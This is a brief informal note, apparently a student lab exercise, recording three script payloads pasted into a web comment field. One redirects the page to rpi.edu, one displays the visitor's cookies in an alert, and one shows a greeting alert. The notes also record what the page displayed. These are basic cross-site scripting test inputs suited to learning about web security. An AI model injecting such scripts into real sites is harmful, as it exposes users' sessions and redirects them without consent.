This is the successfully link to connect the rpi.edu :
<script>location.assign("http://www.rpi.edu");</script>

After i copy (We got your cookie <script>alert(document.cookie);</script>) in the comment, it shows that We got your cookie.

After i copy(Hey there <script>alert("Hi there");</script>) in the comment, it shows that Hey there.
